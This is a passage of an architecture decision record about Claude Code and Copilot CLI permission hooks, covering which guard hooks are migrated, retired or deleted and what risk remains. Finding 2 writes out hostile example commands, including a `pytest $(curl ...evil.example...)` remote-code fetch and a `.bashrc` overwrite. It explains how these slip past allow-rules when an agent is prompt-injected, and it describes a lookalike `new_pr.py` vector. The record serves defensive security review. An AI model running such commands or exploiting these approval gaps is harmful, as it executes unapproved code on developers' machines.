---
# taste-lint: ignore file-size, accepted append-only record; splitting breaks audit continuity.
id: ADR-085
status: accepted
date: 2026-07-31
decision-makers: [rjmurillo]
supersedes: []
superseded-by: null
explainer: null
implemented: true
---

# ADR-085: Cross-Harness Permission-Surface Asymmetry and Hook Survivor Disposition

## Status

Accepted (2026-07-20). Requested by issue #3217 as part of the issue #3197
vendored-hook ROI review. The initial adr-review reached consensus with 5 Accept
plus 1 Disagree-and-Commit. Its historical record is
`.agents/analysis/ADR-085-permission-surface-debate.md`. The superseding
security-amendment review reached consensus with 5 Accept plus 1
Disagree-and-Commit and no unresolved P0. Its record is
`.agents/critique/ADR-085-debate-log.md`. The owner initially ratified D-A as
internal-only and D-B as keep-as-hook.

A later security-policy review established Finding 3: a test-runner command name
cannot prove the executed repository code is safe. After reviewing the direct
conflict with the accepted ADR, the owner explicitly superseded D-B and chose
deletion. D-A remains internal-only. The D-B removal is implemented by
`fix/copilot-hook-contract`. PR #3293 selected D-A's Retirement terminal state
and removed the guard source, registrations, generated artifacts, and dedicated
tests. On 2026-07-22 the owner chose to remove `observation_sync` from the
vendored plugin while retaining the local repository hook. Issue #3217 closed
on 2026-07-28 after confirming `observation_sync` is absent from plugin
registrations and vendored trees, while a Git-hook or CI re-home cannot observe
its MCP event. Issue #3218 closed the same day after confirming the remaining
dispatcher machinery serves live generation paths. The decision's terminal
states are implemented. On 2026-08-11 issue #4874 added the
`require_subagent_model` registration to the vendored inventory; section 6 and
the repo-local `.github/hooks` surface note were updated in the same review
(debate log `.agents/critique/ADR-068-071-085-metric-refresh-debate-log.md`).
On 2026-08-14 issue #5013 excluded `push_pr_script_identity_guard` from the
generated Copilot inventory only. The trigger was a live containment incident:
the guard's plugin-wide `Bash` matcher combined with the Copilot dispatcher's
timed child-process deny (#4706) denied 127 unrelated Bash commands over more
than 21 minutes before the owner applied immediate containment. The root
cause was the guard's broad `Bash` registration paired with a timed child
process that denies on overrun, not a defect in the identity check itself.
Claude Code keeps running the guard unchanged in its own canonical dispatch
group, because its host entry is not a timed child process. Copilot CLI
accepts, as residual risk for the excluded window, the reopened gap that a
prompt-injected repository lookalike `new_pr.py` is no longer denied there.
Section 7 now records the exclusion, the eligibility test applied to it, and
the field-governance and reintroduction requirements; section 6 is otherwise
unchanged and the dispatcher itself is unchanged. Debate log:
`.agents/critique/ADR-068-071-085-5013-debate-log.md`. Sources:
<https://github.com/rjmurillo/ai-agents/issues/3217>,
<https://github.com/rjmurillo/ai-agents/issues/3218>, and
<https://github.com/rjmurillo/ai-agents/issues/5013>.

On 2026-08-18 issue #5154 deleted `push_pr_script_identity_guard` from both
harnesses, superseding the 2026-08-14 Copilot-only exclusion above. The hard
delete removed `invoke_push_pr_script_identity_guard.py`, its nine
`_push_pr_guard_*` companion modules, and dispatch group
`plugin-pretooluse-9-push_pr_script_identity` from `.claude/hooks/hooks.json`
and `.claude/hooks/dispatch_groups.json`. No shim remains to exclude, so the
Copilot exclusion and its `copilotExclude: true` field are moot. The owner
classified the disposition as deleted, which is the terminal state Decision
7's reintroduction gate 8 already admits, so this exercises that gate rather
than bypassing it. The warrant is the owner's own security judgment, not a
cost-benefit veto. The guard's module docstring conceded that its threat model
bounded only invocations that name `new_pr.py`: a command reconstructing the
path without naming the file was out of scope, and an actor able to run
arbitrary code never needed `new_pr.py` to open a pull request. The owner
judged that residual slice not worth a 102 ms tax on every Bash call. Cost is
context for that judgment, not its authority. This decision does not invoke
ADR-084's ROI bar, because
`.agents/architecture/ADR-084-vendored-hook-roi-bar.md ("What this ADR does NOT do")` forbids it:
"It does not authorize retiring an actual security control... a future
reviewer must not use this ADR's ROI bar to retire it." Section 8 complies by
changing the warrant rather than arguing the carve-out away. The 102 ms figure
is the median of five timings taken before deletion, against the dispatch
group this same change deletes, so it is not reproducible from the tree
afterward. The outcome the guard protected, pull requests that meet this
repository's standards, keeps a server-side gate that no local bypass can
evade: `.github/workflows/pr-validation.yml` runs "Validate PR Description vs
Diff", "Validate PR Description Standards"
(`.github/scripts/parse_pr_standards.py`), and "Enforce Blocking Issues"
(`scripts/ci/enforce_pr_validation.py`). That gate catches the outcome, not
the execution, and `.github/workflows/` is not part of the vendored plugin
surface, so a plugin consumer gets no compensating control at all for this
vector. Section 8 records the deletion; section 7 stays as the 2026-08-14
historical record of the containment incident. Source:
<https://github.com/rjmurillo/ai-agents/issues/5154>.

## Amendment Record

PR #3259 replaced the repository's custom Git-hook framework with Lefthook. The
D-A implementation contract now names `lefthook.yml` and CI only for policy they
can observe after a Git or workflow event. Neither surface can preserve
PreToolUse timing or block an arbitrary raw command before execution. The later
security amendment supersedes D-B with deletion; it does not undo this D-A
framework correction.
PR #3293 later implemented D-A as explicit Retirement. It removed the
PreToolUse carrier instead of claiming Lefthook or CI preserved agent-time
blocking.

The 2026-07-31 factual amendment corrected stale #3217 and #3218 ownership
claims. A six-role adr-review accepted the correction. The amendment changed no
runtime behavior or accepted design outcome. It records that both issues are
closed and that future component retirement requires a new architecture
decision.

The 2026-08-18 amendment (issue #5154) supersedes the 2026-08-14 Copilot-only
exclusion with deletion from both harnesses. It does not undo the D-A
framework correction or the D-B deletion above. Section 7 stays in place as
history: it records a real containment incident and the eligibility reasoning
applied to it at the time. Section 8 carries the current position.

## Date

2026-07-20; amended 2026-07-31, 2026-08-11, 2026-08-14, and 2026-08-18

## Context

Issue #3197 authorized shrinking the vendored hook surface the project ships to
consumers. ADR-062 (amended, #3214) retired the LSP-first enforcement family.
ADR-084 (#3215) set the ROI bar that stops the surface re-accreting. Issue #3216
purged non-customer hooks. A small set of survivor hooks remain.

Issue #3217 proposed the next step: move the survivors off hooks and onto
host-native permissions (`permissions.deny`, `permissions.allow`). Its stated
premise was that host-native permissions are "portable across Claude and Copilot
with no dual-surface machinery." Verification falsified that migration premise on
two independent axes, then found a deeper safety defect in the auto-approval goal.

Three survivor hooks were named in #3217 when this ADR began:

- Retired `invoke_skill_first_guard.py` (PreToolUse). It blocked a raw `gh` call when a
  validated skill script existed for that operation. It shipped to Copilot but
  self-neutered outside this repository. PR #3293 selected Retirement and
  removed the source, registrations, generated artifacts, and dedicated tests.
  It was a policy and developer-experience control, not a security boundary.
- Retired `invoke_test_auto_approval.py` (PermissionRequest). Auto-approved a fixed set
  of test-runner commands to cut permission fatigue. It was Claude-only when this
  ADR started. The hook-contract branch briefly generated a Copilot translation,
  then removed both registrations after Finding 3.
- `invoke_observation_sync.py` (PostToolUse). Syncs this repo's internal Serena
  and Forgetful memories. It had no documented plugin-consumer contract. The
  2026-07-22 owner decision removes it from the vendored Copilot surface and
  retains it only in local repository settings.

### Finding 1: Copilot has no repo-committed permission surface, and the guard self-neutered before retirement

GitHub documents session flags and user-level persisted approvals for Copilot CLI.
It documents no repo-committed, fine-grained permission file comparable to
Claude's `.claude/settings.json` `permissions` block. An isolated Copilot CLI
1.0.72-1 help probe found no additional configuration key. The evidence is
recorded in `agent-harness-reference`, not left as an unreproducible negative
claim.

The gap is tracked upstream by the open feature request "Permission Profiles:
named, switchable permission presets (global + per-repo)"
(`github/copilot-cli#3176`). It proposes a committed
`.github/copilot-permissions.json` with `denyTools`, under the permissions epic
`github/copilot-cli#316`; related `github/copilot-cli#2398` requests a default
permissions config file. If Copilot ships a committed permission surface, the
asymmetry closes and this finding should be revisited.

| Harness | Surface | Repo-committed | Fine-grained | Ships with plugin |
|---------|---------|----------------|--------------|-------------------|
| Claude Code | `.claude/settings.json` `permissions.allow`/`deny`, e.g. `Bash(gh pr create:*)` | Yes | Yes, by command pattern | Yes |
| Copilot CLI | Session flags `--allow-tool 'shell(git:*)'` / `--deny-tool` | No | Per-invocation only | No |
| Copilot CLI | `~/.copilot/permissions-config.json` | No, user-global | No, coarse kinds (`write`) keyed by absolute path | No |
| Copilot CLI | `copilot config` | No command rules | No | No |

Migrating `skill_first_guard` to a Claude `permissions.deny` entry would have expressed
the guard for Claude and silently drop it for every Copilot consumer, because no
committed Copilot surface can carry the rule.

There was a second, decisive fact about the guard's behavior before PR #3293.
Its `main()` called `skip_if_consumer_repo("skill-first-guard")` and returned
immediately when true. That helper
(`.claude/lib/hook_utilities/guards.py`) returns true whenever the git origin is
not `ai-agents` (or is unknown and uncorroborated by `pyproject` name). So the
guard enforced only inside the `ai-agents` repo itself. In any consumer repo,
Claude or Copilot, it loaded, checked the guard, and no-oped.

The consequence was that the guard shipped to Copilot but protected no
consumer. That made its disposition an owner-intent question, not a mechanical
one (see D-A). The `github` skill scripts it pointed at still ship to consumers
(`src/copilot-cli/skills/github/scripts/`), which is evidence the guard was meant
to be customer-facing, but the `skip_if_consumer_repo` gate (added #1194,
2026-02-20) contradicts that intent.

### Finding 2: Claude allow-rules do not screen the metacharacters the test hook rejects

The previously registered `invoke_test_auto_approval.py` was not a pure static allowlist. Before matching a
runner pattern it rejects any command containing a shell metacharacter: `;`, `|`,
`&`, `<`, `>`, `$`, backtick, newline, or carriage return
(`DANGEROUS_METACHARACTERS`, lines 22-32). It anchors each pattern to the start of
the command and closed a prior bypass where `python evil.py pytest` auto-approved
because `pytest` appeared anywhere in argv (lines 42-47). It is an injection guard
on an auto-approve path.

Claude Code `permissions.allow` matching (v2.1.x) is aware of shell separators. A
rule like `Bash(pytest *)` will not auto-approve `pytest && other-cmd`, because
Claude splits on the recognized separators (`&&`, `||`, `;`, `|`, `|&`, `&`, and
newlines) and requires each subcommand to match a rule. This fixes the
command-chaining bypass class tracked upstream in anthropics/claude-code#4956.

That separator set does not include command substitution (`$(...)`, backticks) or
redirects (`<`, `>`). Those are not separators, so they do not split the command.
A rule like `Bash(pytest *)` therefore matches, and auto-approves, both of these:

- `pytest $(curl https://evil.example/x.sh)` (command substitution, no inner
  separator), which executes the substitution.
- `pytest > /home/user/.bashrc` (output redirect), which overwrites the file.

The hook rejects both (`$` and `>` are screened). Migrating `test_auto_approval`
to `permissions.allow` would widen what auto-approves without a prompt to include
command-substitution and redirect forms the hook blocks today. On an auto-approve
path, under an autopilot or prompt-injection threat model, that is a security
regression, not a neutral refactor. Risk score 7/10: command execution or file
overwrite with no confirmation prompt, reachable by prompt-injected agent input
(CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N).

No `permissions.deny` companion cleanly closes the gap. The decisive reason is
scope: a deny rule applies to every command, not only the allow path that carries
the risk, so a global `Bash(*$*)`-style deny would also block legitimate
interactive `pytest` invocations that contain `$`, even ones the user approves by
hand. A secondary reason is expressiveness: deny rules are prefix and glob, and
`$` escaping in Claude's glob engine is undocumented, so a rule scoped to "pytest
containing `$`" cannot be written with confidence. The hook's screen is also not
total: it rejects `$` and backtick but not tilde (`~`) or brace (`{a,b}`)
expansion, a lower-severity path gap (risk 3/10) that migration would not change
either way.

### Finding 3: A runner name is not a trust boundary

This finding was discovered during the later security-policy review, after the
initial review and owner ratification kept D-B. It triggered the superseding
deletion decision. Findings 1 and 2 were available before that first decision.

Finding 2 compares two auto-approval carriers. It does not establish that either
carrier is safe. An exact `pytest`, Pester, or package-test command still executes
repository-controlled code. Test collection imports modules and fixtures. Plugins
and configuration can run code before a test body. Package-manager test commands
run repository-defined scripts. Runner options can also select external paths or
destructive behavior.

The prior hook screened shell metacharacters and tightened command-prefix matching.
Those checks reduce shell-syntax bypasses. They do not prove the code selected by
the runner is safe. Under a prompt-injection or untrusted-repository threat model,
auto-approving the runner grants unprompted user-level code execution.

Safety-audit findings 19 and 48 record the producer's command-pattern and
input-shape defects. The full-context security review at
`.serena/memories/reviews/fix-copilot-hook-contract-213f3af.md` records the deeper
repository-code issue. The protected assets are the developer workstation,
repository state, credentials available to the process, and the user's approval
decision.

## Decision

### 1. General eligibility test for hook-to-permissions migration

A vendored guard hook may be replaced by host-native permissions only when all
three hold:

1. **Portability.** An equivalent repo-committed, shippable permission surface
   exists on every harness the hook targets. A hook that ships to Copilot fails
   this until Copilot gains a committed permission surface. Session flags,
   user-global config, and wrapper arguments do not qualify.
2. **Fidelity.** The hook carries no parsing or injection semantics the
   permission surface cannot replicate. A hook that screens command substitution,
   backticks, or redirects on an auto-approve or auto-deny path fails this on
   Claude today, because `permissions.allow` splits on separators only.
3. **Policy safety.** The underlying allow or deny policy establishes a real
   safety boundary. A process or runner name alone does not prove that the code
   it loads, discovers, imports, or executes is safe. Portability and fidelity
   are necessary but cannot legalize an unsafe policy.

### 2. `skill_first_guard`: remove it from the vendored surface; preserve only enforceable policy (D-A)

Do not migrate `skill_first_guard` to a Claude `permissions.deny` rule. It fails
portability (ships to Copilot, no committed Copilot surface). A permissions rule
also cannot express the guard's conditional logic ("deny raw `gh X` only when a
skill exists") or its instructional block message.

Rejecting a permissions migration does not require preserving a hook. It means a
declarative deny rule is not an equivalent replacement. The current shipped-dead
state, self-neuter via `skip_if_consumer_repo` on a hook shipped to Copilot, is a
direct ADR-084 rule 4 violation. Leaving D-A unresolved is not a valid end state.

**Resolution (owner, 2026-07-20): internal-only.** `skill_first_guard` is
dogfood-only developer experience, not customer-facing. Stop shipping it on the
vendored surface. This differs from the adr-review recommendation
(customer-facing), and the owner ruled under User Sovereignty. #3218 rescopes to
retire machinery whose last consumer this removal eliminates.

This scope decision does not claim a behavior-preserving relocation. Lefthook and
CI receive Git or workflow events, not the PreToolUse payload, and cannot block a
raw `gh` command before it executes. The #3217 implementation contract required:

1. Remove the guard from the vendored surface and generated registrations.
2. Name any repository-state invariant that remains enforceable through
   `lefthook.yml` or CI, including its trigger, failure behavior, and acceptance
   test.
3. Record retirement of pre-execution blocking unless a separate decision
   approves a non-vendored agent-time carrier.

The D-A portion of #3217 may reach completion only in one of two terminal
states:

1. **Repository-only agent-time carrier.** A separate decision approves a
   non-vendored PreToolUse carrier. Build and artifact tests prove the guard is
   absent from both plugin manifests and the generated `src/copilot-cli` tree.
   A live repository test proves matching raw `gh` calls are blocked and allowed
   skill invocations still pass.
2. **Retirement.** The guard source, registrations, and dedicated tests are
   removed. Repository instructions state that skill-first behavior is static
   guidance only, with Lefthook and CI covering only state they can observe.

A move to Lefthook or CI that claims raw-command equivalence satisfies neither
terminal state. For this guard, ADR-084 rule 4 applies only when Git or workflow
state exposes an enforceable invariant. When none exists, explicit retirement
satisfies the rule's non-vendoring purpose.

PR #3293 selected terminal state 2, Retirement. It removed the guard source,
all registrations, generated Copilot artifacts, and dedicated tests. Repository
instructions retain skill-first as a static MUST-level rule. No Lefthook or CI
surface claims equivalent pre-execution interception. That completes D-A. The 2026-07-22 owner decision also closes the remaining
`observation_sync` disposition by removing its vendored registration.

### 3. `test_auto_approval`: delete the auto-approval path (D-B superseded)

Delete `test_auto_approval`, its Claude registrations, its generated Copilot
artifacts, and its producer-specific tests. Do not replace it with
`permissions.allow`. Finding 2 rejects migration because the declarative surface
loses metacharacter screening. Finding 3 rejects keeping the hook because the
screened runner still executes repository-controlled code without a prompt.

Retain the generic PermissionRequest translation adapter and its synthetic tests.
The adapter is inert without a registered producer and preserves a reviewed
cross-harness capability for a future policy that establishes a real safety
boundary. Any future producer requires a new security review, positive, negative,
edge, and destructive-option tests, plus a fresh host-contract probe.

The owner initially ratified D-B as keep-as-hook. After the deeper security finding
and an explicit reconciliation against the accepted ADR, the owner superseded that
decision and chose deletion. Normal host permission handling now remains
authoritative for test execution.

### 4. `observation_sync`: remove from the vendored surface

It makes no permission decision, so it is not a permissions candidate. As a
PostToolUse hook it fires after tool execution; permissions gate only before
execution, so no permission rule can carry its behavior. It syncs this repo's
internal Serena and Forgetful stores. The installed plugin previously executed a repository-controlled importer
after checking only the repository basename. A different repository named
`ai-agents` could satisfy that identity check. The owner chose removal from the vendored source. Local `.claude/settings.json`
retains the hook for this repository. Issue #3217 closed on 2026-07-28 after
confirming the customer-facing intent is already met: the hook is absent from
plugin registrations and vendored trees, and a Git-hook or CI re-home cannot
observe the MCP event.

### 5. Component-level machinery disposition

Issue #3218 closed on 2026-07-28 after verification showed its retirement
premise was wrong. `_expand_dispatch_groups` and `event_matcher_union` remain
live generation paths, while parity tests cover generated surfaces. A
surviving hook retains only the components it uses. The dispatcher may be
removed or replaced by direct host registrations while hooks remain, but that
change requires a new architecture decision. A future permission surface can
replace only eligible pre-execution policy hooks; it cannot carry PostToolUse
observers. A component may retire when it has zero active consumers or when a
tested replacement preserves its host contract.

### 6. Confirmation

The eligibility test (Decision 1) is applied at adr-review time for any future
hook-to-permissions migration proposal. ADR-084 rule 5's vendored-hook presence
check is planned but not built; human ADR and PR review is the current gate. Decision 5 is confirmed done when both hold: every
dispatcher, translation-adapter, parity, and drift component whose last
surviving hook consumer is gone is either removed or retained by a named
accepted decision with dedicated tests; and each component still referenced by
a surviving vendored hook is listed with the hook that keeps it alive. Decision
3 is the named retention decision for the dormant generic PermissionRequest
adapter. Removing that adapter requires superseding this decision, not treating
zero active producers as implicit approval. As of 2026-08-14 the vendored source had four registrations across two events:
`markdownlint_guard`, `push_pr_script_identity_guard`,
`require_subagent_model`, and `markdown_auto_lint`. Copilot generation then emitted two host registrations. Issue #5013 excluded
`push_pr_script_identity_guard` from the generated Copilot inventory only: the
four-registration count above described the vendored Claude source, and
the Copilot-side PreToolUse manifest then carried the remaining two shims,
`markdownlint_guard` and `require_subagent_model`. Issue #5154 (2026-08-18)
re-baselined both counts. It deleted `push_pr_script_identity_guard` from both
harnesses (section 8) and deleted `markdownlint_guard` and
`markdown_auto_lint` in the same change. `require_subagent_model` is the only
survivor, so the vendored source then had one registration on one event,
PreToolUse, and Copilot generation emitted one host registration. Issue
#5061, landed independently the same day and merged with #5154 on
2026-08-19, added `serena_memory_scope_guard` to the same event: the
vendored source now has two registrations on one event, PreToolUse, and
Copilot generation still emits one host registration, since one dispatcher
entry serves every registered shim for an event regardless of shim count
(ADR-068 Decision point 1). This repository also
registers the require-subagent-model gate directly at
`.github/hooks/require-subagent-model.json` for local Copilot runs; cloud
agent reads only default-branch `.github/hooks/*.json`, so cloud coverage
begins at merge. That surface is repository-local and outside the plugin
inventory. On the Claude side this repository carries no `settings.json` twin:
the duplicate-entry contract forbids one, and gate-mode groups skip the
dispatcher self-host bail, so in-repo Claude enforcement arrives through the
installed plugin as it updates. #3218
closed after deriving its consumer list from active source registrations and
generated manifests. Any future retirement or replacement requires reference
search, regeneration, and artifact tests that prove no active consumer lost
its required behavior.

The current dispatcher state is not permanent debt accepted by documentation.
Each retained component must record why direct registration or deletion would
lose a measured host contract or cost more than the retained machinery.
Simplification requires a new architecture decision.

### 7. `push_pr_script_identity_guard`: temporary Copilot-only exclusion, Claude retained (D-C)

Superseded on 2026-08-18 by section 8, which deletes the guard from both
harnesses. This section stays as the historical record of the 2026-08-14
containment incident and the reasoning applied to it. Read it as history, not
as the current disposition.

Issue #5013 (2026-08-14) excluded `push_pr_script_identity_guard` from the
generated Copilot inventory only, in response to the containment incident
recorded in Status: the guard's plugin-wide `Bash` matcher paired with the
Copilot dispatcher's timed child-process deny (#4706) denied 127 unrelated
Bash commands over more than 21 minutes. `.claude/hooks/dispatch_groups.json`
marks the group `copilotExclude: true` and still lists the guard in Claude
Code's canonical dispatch group. `.claude/hooks/hooks.json` still registers
that group. This ADR is the policy authority for the exclusion; ADR-068
and ADR-071 record only the derived dispatcher and runtime metrics that
result from it.

**Eligibility test applied (Decision 1).** This exclusion is not a
hook-to-permissions migration, so Decision 1's three-part test does not admit
or reject it directly. Applied by analogy, it bounds what a temporary
exclusion may claim:

1. **Portability.** The question is inverted here: the guard already ships on
   both harnesses today, and the field removes it from one. No permission
   surface replaces it on Copilot. Copilot regains no equivalent policy; it
   regains nothing.
2. **Fidelity.** Removing the guard from Copilot removes all of its fidelity,
   not a partial subset. There is no partial-fidelity carrier and none is
   claimed.
3. **Policy safety.** The guard's underlying policy, deny a noncanonical
   `new_pr.py` invocation, remains a real safety boundary. Excluding the guard
   from Copilot does not make that boundary safe to skip. It accepts skipping
   it as a temporary, contained cost.

Containment passes temporarily because the alternative, 127 unrelated denials
recurring on every Copilot Bash call, is an availability failure with no
compensating security benefit: the guard was denying commands it was never
meant to evaluate, not catching a live attack. The remaining security cost is
real and named, not eliminated: while excluded, Copilot CLI has no guard
against a prompt-injected repository lookalike `new_pr.py` gaining user-level
Python execution through `/push-pr`. Claude Code is unaffected because its
host entry is not a timed child process and the guard runs there unchanged.

**Generic field governance.** A generic `copilotExclude` field on a
dispatch-group shim entry is allowed only when all of the following hold, not
merely a boolean flip:

1. Strict boolean validation. The generator rejects any `copilotExclude`
   value that is not literally `true` or `false`; a truthy non-boolean value
   such as `1`, `"true"`, or `null` fails generation rather than silently
   including or excluding the shim.
2. Plugin surface named. The record states which generated surface loses the
   shim, the Copilot plugin `hooks.json` and its manifest, and which surface
   keeps it, the vendored Claude plugin source and the unaffected
   `.claude/settings.json`.
3. Issue metadata. The record names the issue that authorized the exclusion,
   #5013, in the field's generator comment and in this ADR.
4. Decision metadata. The record names the ADR that owns the security
   judgment, this ADR, not the mechanical ADR that owns dispatcher shape,
   ADR-068.
5. Residual risk stated. The record states what protection is lost on the
   excluded harness while the field is `true`, the `new_pr.py` lookalike gap
   above.
6. Unaffected-harness behavior stated. The record states that the
   non-excluded harness is unchanged and names the mechanism, the field is
   ignored by `invoke_dispatch_claude.py`.
7. Reintroduction criteria named. The record names the gates a future change
   must pass before flipping the field back to `false`, the eight gates
   below.
8. Cleanup obligation named. The record states that a permanent exclusion
   requires removing the dead Copilot-side generation path rather than
   leaving `copilotExclude: true` as permanent scaffolding.
9. Tests required. The record names the tests that must pass before and
   after any change to the field: absence regressions on the Copilot side,
   presence regressions on the Claude side, and the boolean-validation test
   in item 1.

**Reintroduction gates.** Issue #5013 and assignee rjmurillo own
reintroduction. Reintroduction is optional and requires rjmurillo's approval
before the field reverts to `false`. All eight gates below must pass in the
same change:

1. Unrelated commands never launch the guard's child process on Copilot.
2. The canonical `new_pr.py` invocation is allowed.
3. A prompt-injected repository lookalike `new_pr.py` is denied.
4. A dynamic launcher, `python -c`, `eval`, or shell substitution, targeting
   `new_pr.py` is denied.
5. A Windows load test of 32 calls across 8 workers completes without a false
   denial.
6. Latency stays under a 500ms p95 and a 1 second maximum across that load
   test.
7. The measurement runs against a real Copilot CLI probe, not a simulated
   harness.
8. The owner classifies the guard's disposition as deleted or essential
   before it returns to the generated inventory.

Debate log: `.agents/critique/ADR-068-071-085-5013-debate-log.md`.

### 8. `push_pr_script_identity_guard`: deleted from both harnesses (D-D)

Issue #5154 (2026-08-18) deletes the guard outright. This supersedes section
7. The change deleted `.claude/hooks/PreToolUse/invoke_push_pr_script_identity_guard.py`,
its nine `_push_pr_guard_*` companion modules, and dispatch group
`plugin-pretooluse-9-push_pr_script_identity` from `.claude/hooks/hooks.json`
and `.claude/hooks/dispatch_groups.json`. Claude Code no longer runs the
guard. Copilot generation no longer skips it, because nothing is left to skip:
the Copilot exclusion, its `copilotExclude: true` field, and the
`copilotExcludeIssue` and `copilotExcludeDecision` metadata attached to that
group are moot and go away with the group. The generic-field governance in
section 7 still binds any future use of `copilotExclude` on another group; it
no longer describes any live registration.

**Owner classification.** Section 7's reintroduction gate 8 requires the owner
to classify the guard's disposition as deleted or essential. On 2026-08-18
rjmurillo classified it as deleted. That closes the gate rather than
bypassing it: gate 8 names deletion as a valid terminal answer, and the other
seven gates measure a reintroduction that will not happen. Section 7's
cleanup obligation is also satisfied, because a permanent exclusion required
removing the dead Copilot-side generation path instead of leaving
`copilotExclude: true` as standing scaffolding.

**Decision driver: the owner's security judgment.** The warrant is a judgment
about what the guard actually bounded, made by the person who owns the
security posture of this repository. The guard's own module docstring conceded
the threat model: it bounded only invocations that name `new_pr.py`. A command
that reconstructs the path without naming the file was out of scope, and an
actor able to run arbitrary code never needed `new_pr.py` to open a pull
request at all. What remained was a narrow slice of the vector, and the owner
judged that slice not worth a 102 ms tax on every Bash call in Claude Code.
The cost is context for the judgment. It is not the authority for it.

The 102 ms figure is the median of five timings taken before deletion, against
the now-deleted group through `python3 -u
.claude/hooks/invoke_dispatch_claude.py --group
plugin-pretooluse-9-push_pr_script_identity` with a `git status --short`
payload on Python 3.14.6. Because this change deletes that dispatch group, the
number is not reproducible from the tree afterward. It is recorded here as
measured-then evidence, not as a figure a later reader can re-derive.

**ADR-084's carve-out, and why this decision does not invoke the ROI bar.**
`.agents/architecture/ADR-084-vendored-hook-roi-bar.md ("What this ADR does NOT do")` states: "It
does not authorize retiring an actual security control. A hook that enforces a
security property in consumer repos earns its place by that property, not by
an ROI cost-benefit veto, and a future reviewer must not use this ADR's ROI
bar to retire it." That carve-out binds. This decision complies with it by
changing the warrant, not by arguing the carve-out away or claiming the guard
was never a security control. ADR-084's ROI bar is not cited as authority
anywhere in this decision. The authority is the disposition power that section
7's reintroduction gate 8 already assigns to the owner, exercised on the
owner's reading of the threat model above.

**Where the protected outcome is enforced now, and what that does not cover.**
Pull requests that meet this repository's standards are gated server side by
`.github/workflows/pr-validation.yml`, which runs "Validate PR Description vs
Diff", "Validate PR Description Standards"
(`.github/scripts/parse_pr_standards.py`), and "Enforce Blocking Issues"
(`scripts/ci/enforce_pr_validation.py`). No local bypass evades that gate: it
runs on the GitHub side of the push, so `--no-verify`, a disabled hook, or a
deleted guard changes nothing about whether the pull request passes. The gate
catches the outcome, not the execution. It reads a pull request that already
exists; it cannot stop the local Python execution the guard was watching for.
`.github/workflows/` is also not part of the vendored plugin surface. A plugin
consumer inherits no workflow from this repository, so for this vector a
consumer gets no compensating control at all, not a weaker one.

**Residual risk accepted.** The guard's own module docstring already conceded
the limit of what it bounded. A command that reconstructs the path to
`new_pr.py` without naming the file was out of scope, and an actor able to run
arbitrary code never needed `new_pr.py` to open a pull request. Deleting the
guard therefore widens an already porous boundary rather than removing a tight
one. The security cost is real and named: neither harness now denies a
prompt-injected repository lookalike `new_pr.py` at agent time. The
server-side gate above catches the outcome, not the execution.

**Reversibility.** Reintroduction is a new architecture decision, not a field
flip. A future proposal must restore the hook source and its companions, add a
narrower matcher than bare `Bash`, and clear the measurable gates section 7
lists, before any registration returns to either harness.

### 9. `markdownlint_guard`: deleted, markdown linting belongs in Git hooks (D-E)

Issue #5154 (2026-08-18) deleted the push-time markdown gate: the retired
`invoke_markdownlint_guard.py`, its `push_guard_base.py` framework module, and
dispatch group `plugin-pretooluse-8-markdownlint_guard`. The retired hook
registered on `Bash(git push*)` and ran `markdownlint-cli2` over the `*.md`
files in the push changeset.

**Owner classification.** The owner classified the disposition as deleted. The
stated reason is placement: linting can be done outside the harness, with Git
hooks or Lefthook. Markdown linting is a commit-time and push-time concern. It
belongs in a Git hook that fires once per commit or push, not in a
per-tool-call agent hook that spawns an interpreter on every `git push` the
model issues.

**Rationale: placement, not ROI.** This is a judgment about where a check
belongs, not a cost-benefit veto on whether the check is worth running. The
check keeps running; it moves to the scheduler whose trigger matches its
subject. ADR-084's carve-out under "What this ADR does NOT do" governs retiring an actual
security control by ROI. Markdown lint is a formatting gate, no ROI argument
is offered here, so the carve-out does not arise. ADR-086 makes Lefthook the
sole Git-hook scheduler in this repository, which is the surface that receives
the work.

**Settled fact: this guard self-neutered in consumer repos.** Two reviewers
disagreed, so the source at `HEAD` settles it. The deleted
`push_guard_base.run_guard` opened its body with `if skip_if_consumer_repo(name): return 0`,
and the deleted `invoke_markdownlint_guard.py` defined `main()` as
`return run_guard(_validate, ["*.md"], GUARD_NAME)`. In a consumer repo the
guard therefore returned 0 before it read stdin, so it never ran
`markdownlint-cli2` there. The record at
`.agents/critique/ADR-084-debate-log.md:17` says the opposite: it credits a
reviewer with verifying that the now-removed guard was "not
`skip_if_consumer_repo` gated and run in consumer repos". That verification
was wrong, and this decision corrects it. Two consequences follow. The
retired guard was a standing violation of ADR-084 rule 4, which bans
self-neutering vendored hooks. And consumer-side coverage from this particular
hook was already zero before the deletion, so for this hook the panel's
drop-to-zero finding describes a state that already held.

**Residual risk accepted.** What the deletion actually removes is agent-time
markdown enforcement inside this repository: the model can no longer be
blocked at `git push` by a lint failure the plugin detects. The Lefthook
equivalent is already in place and this decision previously overstated the
gap: `lefthook.yml` runs `markdown-autofix` and `markdown-check` at
pre-commit over staged `**/*.md`, so an ordinary commit is still linted
locally. What remains is narrower than "a push reaches the remote
unchecked": a violation in a file the commit did not stage, or a commit made
with `SKIP_AUTOFIX=1`, is no longer caught at push time and surfaces in CI
instead. The owner accepts that. For plugin consumers the answer is blunter: this hook
never ran in a consumer repo, so the plugin was not providing them a
push-time markdown gate to lose, and this decision stops implying otherwise
rather than claiming continuity.

**Reversibility.** Restoring a push-time markdown gate is a Lefthook
configuration change, not a plugin change. Returning it to the vendored plugin
surface requires a new architecture decision that also answers ADR-084 rule 4,
because the deleted shape could not ship to consumers without self-neutering.

### 10. `markdown_auto_lint`: deleted, the same placement judgment (D-F)

Issue #5154 (2026-08-18) also deleted the PostToolUse auto-fixer: the retired
`invoke_markdown_auto_lint.py` and dispatch group
`plugin-posttooluse-1-markdown_auto_lint`. The removed hook matched
`^(Write|Edit)$` and ran `markdownlint-cli2 --fix` on each `.md` file the
model touched.

**Owner classification.** The owner classified the disposition as deleted,
under the same placement judgment as section 9: markdown linting belongs in
Git hooks or Lefthook, not in a hook that spawns an interpreter on every
Write and every Edit. The per-tool-call trigger is the thing being rejected,
not the linting.

**Rationale: placement, not ROI.** As in section 9, no ROI argument is offered
and ADR-084's carve-out under "What this ADR does NOT do" does not arise, because a markdown
auto-fixer is not a security control. A file-by-file auto-fix on every edit
also does work a single pre-commit pass does once, so the commit-time
scheduler is the cheaper and more predictable home for it.

**Residual risk accepted, and it is larger here than in section 9.** Unlike
the retired push guard, this deleted hook carried no `skip_if_consumer_repo`
call anywhere in its source, so it did run in consumer repos. Deleting it
therefore does drop consumer-side markdown coverage from this plugin to zero:
